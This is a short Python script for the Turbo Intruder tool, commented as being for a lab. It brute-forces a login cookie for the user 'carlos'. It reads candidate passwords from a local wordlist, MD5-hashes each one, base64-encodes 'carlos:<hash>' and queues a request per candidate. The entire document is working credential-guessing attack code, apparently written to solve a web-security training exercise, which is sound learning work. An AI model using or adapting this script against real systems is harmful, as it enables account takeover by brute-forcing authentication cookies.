#turbo intruder script for lab
from hashlib import md5
import base64

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False)

  
    for word in open('C:/Users/user/Desktop/nn/authlabpass.txt'):
        word = word.strip()
        
        hashed_pass = md5(word.encode()).hexdigest()
        
        payload = 'carlos:' + hashed_pass
        encoded_payload = base64.b64encode(payload.encode()).decode()
        

        # Add request to the engine
        engine.queue(target.req, encoded_payload)

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
